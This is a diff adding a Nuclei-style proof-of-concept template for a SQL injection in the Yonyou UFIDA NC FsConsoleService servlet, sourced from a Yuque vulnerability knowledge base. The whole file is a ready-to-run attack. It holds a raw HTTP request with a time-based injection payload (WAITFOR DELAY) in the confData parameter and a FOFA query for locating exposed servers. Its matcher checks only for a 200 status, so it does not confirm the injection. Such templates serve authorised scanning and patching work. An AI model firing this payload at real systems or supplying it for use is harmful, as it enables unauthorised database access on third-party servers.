@@ -1,0 +1,31 @@
+id: poc-wsc1rkx8srtyl6r3
+info:
+  name: 用友-UFIDA-NC uap.pub.fs.console.FsConsoleService存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wsc1rkx8srtyl6r3'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wsc1rkx8srtyl6r3
+    fofa: app="用友-UFIDA-NC"
+http:
+- raw:
+  - 'GET /servlet/~uapbs/uap.pub.fs.console.FsConsoleService?confData=guid%3d233%27;WAITFOR+DELAY+''0:0:5''--+&operType=filterLog HTTP/1.1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+
+    like Gecko) Chrome/91.0.4472.77 Safari/537.36
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
